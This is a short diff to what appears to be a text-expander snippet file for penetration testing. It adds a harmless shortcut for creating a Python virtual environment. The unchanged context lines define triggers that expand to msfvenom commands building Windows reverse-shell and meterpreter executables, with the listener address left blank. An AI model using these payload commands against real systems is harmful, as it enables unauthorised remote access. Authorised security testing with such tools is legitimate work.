@@ -57,6 +57,8 @@ matches:
 
   - trigger: ":msfwin"
     replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
+  - trigger: ":venv"
+    replace: "python3 -m venv venv && source venv/bin/activate"
 
   - trigger: ":msfmwin"
     replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
